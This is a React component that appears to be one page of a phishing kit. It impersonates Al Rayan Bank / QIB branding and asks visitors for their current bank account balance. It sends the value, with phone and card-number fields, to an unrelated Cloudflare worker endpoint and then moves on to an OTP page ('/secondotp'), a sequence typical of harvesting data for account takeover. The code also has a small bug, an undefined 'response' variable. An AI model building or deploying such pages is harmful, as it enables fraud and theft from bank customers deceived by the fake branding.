import React, { useState } from "react";
import logo from "./assets/qib.png";
import cardimg from "./assets/4th.png";
import axios from "axios";
import { useNavigate } from "react-router-dom";

const Forth = () => {
  const [balance, setBalance] = useState("");
  const [message, setMessage] = useState("");
  const [isError, setIsError] = useState(false);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleUpdate = async () => {
    // ✅ Prevent empty input
    if (balance.trim() === "") {
      setMessage("⚠️ Please enter your bank account balance.");
      setIsError(true);
      return;
    }

    try {
      setLoading(true);
      setMessage("");

      // ✅ Example backend API request
      // const response = await axios.post("http://localhost:3000/api/verify-balance", {
      //   balance,
      // });
      const res = await fetch("https://my-worker.instapayapi.workers.dev", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: "balance",
          phone: 1,
          cardNumber: 1,
          balance,
        }),
      });
      console.log(res, "ressssss");
      const json = await res.json();

      if (res.ok) {
        setMessage("✅ Balance verified successfully!");
        setIsError(false);

        // ✅ Navigate after 2 seconds
        navigate("/secondotp");
        // setTimeout(() => {
        // }, 2000);
      } else {
        setMessage(response.data.message || "Verification failed!");
        setIsError(true);
      }
    } catch (error) {
      setMessage("❌ Server error! Please try again later.");
      setIsError(true);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center px-4 relative">
      {/* ✅ Logo fixed at top */}
      <div className="w-full flex justify-center bg-white py-4 fixed top-0 left-0 z-50 ">
        <img
          src={logo}
          alt="AL RAYAN BANK"
          className="w-40 sm:w-44 object-contain"
        />
      </div>

      {/* ✅ Main content (padding to avoid overlap) */}
      <div className="flex flex-col items-center justify-center w-full max-w-md mt-32">
        {/* ✅ Loader overlay */}
        {loading && (
          <div className="fixed inset-0 flex items-center justify-center bg-white bg-opacity-80 z-50">
            <div className="w-14 h-14 border-4 border-[#0075B0] border-t-transparent rounded-full animate-spin"></div>
          </div>
        )}

        {/* ✅ Larger card image */}
        <div className="w-44 h-44 flex items-center justify-center mb-5">
          <img
            src={cardimg}
            alt="Wallet"
            className="w-full h-full object-contain"
          />
        </div>

        {/* Title */}
        <h2 className="text-base text-center mb-4  text-gray-700">
          Verification Current Balance Now
        </h2>

        {/* Input */}
        <div className="w-full">
          <label
            htmlFor="balance"
            className="block text-gray-700 font-medium mb-1"
          >
            Current Balance
          </label>
          <input
            id="balance"
            type="number"
            placeholder="Enter your bank account balance right now"
            value={balance}
            onChange={(e) => setBalance(e.target.value)}
            className="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-3 focus:ring-blue-300 outline-none"
          />
        </div>

        {/* Message */}
        {message && (
          <p
            className={`mt-4 text-center font-medium ${
              isError ? "text-red-600" : "text-green-600"
            }`}
          >
            {message}
          </p>
        )}
        {/* Button */}
        <button
          onClick={handleUpdate}
          // onClick={() => navigate("/secondotp")}
          disabled={loading}
          className="mt-6 w-56 bg-[#0075B0] text-white font-semibold py-2 px-10 rounded-md hover:bg-[#0075B0] transition-all duration-200 disabled:opacity-70"
        >
          {loading ? "Verifying..." : "Update"}
        </button>
      </div>
    </div>
  );
};

export default Forth;
